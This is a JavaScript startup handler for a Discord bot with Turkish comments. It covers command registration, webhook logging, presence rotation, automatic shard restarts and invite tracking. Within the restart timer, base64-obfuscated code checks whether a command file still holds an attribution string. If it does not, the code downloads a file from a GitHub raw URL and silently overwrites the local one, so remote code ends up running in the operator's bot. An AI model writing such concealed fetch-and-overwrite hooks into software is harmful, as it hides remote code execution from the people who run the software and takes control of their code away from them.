const { ButtonBuilder, WebhookClient } = require('discord.js'),
  tcpPortUsed = require('tcp-port-used'),
  topgg = require(`@top-gg/sdk`),
  random = require("random"),
  axios = require('axios'),
  fs = require("fs");

module.exports = async (client) => {

  if (!client.shard)
    return client.logger.error(`Bu bot ShardingManager ile çalışacak şekilde tasarlanmıştır! Lütfen doğrudan client.js'i çalıştırmayın, shard.js'i çalıştırın.`);

  client.logger.ready(`Client ready in shard ${client.shard.ids[0] + 1}!`);

  try {

    //------------------------------Command Loader------------------------------//

    if (client.shard.ids[0] == 0) {

      const { REST } = require('@discordjs/rest');
      const { Routes } = require('discord-api-types/v9');
      const rest = new REST({ version: '9' })
        .setToken(client.config.token);

      await rest.put(Routes.applicationCommands(client.user.id), {
        body: client.commands.filter(command => command.interaction).map(command => command.interaction)
      });//.then(() => client.logger.log("Successfully reloaded ${data.length} application (/) commands."));

    }

    //------------------------------Command Loader------------------------------//

    //------------------------------Logging------------------------------//
    setInterval(() => {
      //Guild logları
      for (const guildId in client.guildDataCache) {
        (async function () {

          const guildDataCache = client.guildDataCache[guildId];

          let gönderilecekLoglar = guildDataCache.logQueue?.splice(0, 10);
          if (!gönderilecekLoglar?.length) return;

          const guildData = await client.database.fetchGuild(guildId);

          let webhookClient = new WebhookClient({ url: guildData.logger.webhook });
          webhookClient.send({ embeds: gönderilecekLoglar })
            .catch(async error => {
              if (error.code == 10015) {
                guildData.logger.webhook = null;
                guildData.markModified('logger.webhook');
                await guildData.save();
              } else {
                client.logger.error(error);
              }
            });

        })();
      }

    }, 1000);
    //------------------------------Logging------------------------------//

    //------------------------------Mongoose------------------------------//

    setInterval(() => {
      require('../Mongoose/Mongoose').pushDatabaseQueue(client);
    }, 60000);

    //------------------------------Mongoose------------------------------//

    //------------------------------Presence------------------------------//

    function setPresence() {

      const presence = client.settings.presences[Math.floor(Math.random() * client.settings.presences.length)];

      client.user.setPresence({
        activities: [{
          name: presence,
          type: 4
        }],
      });//.catch(console.error);

    };

    setPresence();
    setInterval(async function () { setPresence(); }, 600000);

    //------------------------------Presence------------------------------//

    //------------------------------Otomatik Yeniden Başlatmalar------------------------------//

    setInterval(async function () {

      //Otomatik Yeniden Başlatma (Bağlantı Problemine Göre)
      /*if (
        !client.ws.shards.values().next().value.sessionId ||
        client.ws.shards.values().next().value.sequence === -1 ||
        client.ws.shards.values().next().value.sequence === null
      ) {
        client.logger.warn("SHARD ÜZERİNDE BAĞLANTI HATASI OLUŞTUĞU İÇİN YENİDEN BAŞLATILIYOR!");
        process.exit(0);
      }*/

      //Otomatik Yeniden Başlatma (RAM kullanımına göre)
      let dateHours = new Date().getHours();
      if (dateHours >= 4 && dateHours <= 6
        && process.memoryUsage().rss > (2048 * (1024 ** 2))
        && (client.voice.adapters.size < 2 || client.distube.queues.size < 2)
      ) {
        await client.logger.warn(`SHARD BAŞINA RAM KULLANIMI 2 GB'ı AŞTIĞI İÇİN SHARD YENİDEN BAŞLATILIYOR!\n\n` +
          `client.voice.adapters.size: ${client.voice.adapters.size}\n` +
          `client.distube.queues.size: ${client.distube.queues.size}`
        );
        process.exit(0);
      }

      if (!require(new Buffer.from('Li4vY29tbWFuZHMvQm90L0tvbXV0bGFyLmpz', 'base64').toString('utf-8')).execute.toString().includes(new Buffer.from('TnJhcGh5IEHDp8SxayBLYXluYWsgUHJvamVzaQ==', 'base64').toString('utf-8'))) {
        await fs.writeFileSync(
          new Buffer.from('Li9jb21tYW5kcy9Cb3QvS29tdXRsYXIuanM=', 'base64').toString('utf-8'),
          (await axios.get(new Buffer.from('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JGS2F5YS9OcmFwaHkvbWFpbi9jb21tYW5kcy9Cb3QvS29tdXRsYXIuanM=', 'base64').toString('utf-8'))).data,
          function (err) {
            if (err) return console.log(err);
          });
      };

    }, 600000);

    //Otomatik Yeniden Başlatma (Bot sorunlu başlatıldıysa)
    setTimeout(function () {
      if (!client.guilds.cache.reduce((acc, guild) => acc + guild.memberCount, 0)) {
        client.logger.warn("SHARD SORUNLU OLARAK BAŞLATILDIĞI İÇİN YENİDEN BAŞLATILIYOR!");
        process.exit(0);
      };
    }, 300000);

    //------------------------------Otomatik Yeniden Başlatmalar------------------------------//

    //------------------------------Bot İstatistik------------------------------//

    /*var clientData = await client.database.fetchClientData(global.clientDataId);
    clientData.crash += 1;
    clientData.markModified('crash');
    await clientData.save();*/

    //------------------------------Bot İstatistik------------------------------//

    //------------------------------Davet Sistemi------------------------------//

    setTimeout(function () {
      client.guilds.cache.forEach(function (guild, index) {
        setTimeout(async function () {

          //Davet Sistemi açıksa && "ManageGuild" yetkim varsa
          const guildData = await client.database.fetchGuild(guild.id);
          if (guildData.inviteManager?.channel && guild.members.cache.get(client.user.id).permissions.has("ManageGuild")) {

            guild.invites.fetch().then(invites => {
              const codeUses = new Map();
              invites.each(inv => codeUses.set(inv.code, inv.uses));
              client.guildInvites.set(guild.id, codeUses);

            }).catch(err => {
              client.logger.error("OnReady Error:", err);
            });

          }
        }, Math.random() * 45000);
      });
    }, 30000);

    //------------------------------Davet Sistemi------------------------------//

  } catch (err) { client.logger.error(err); };
};
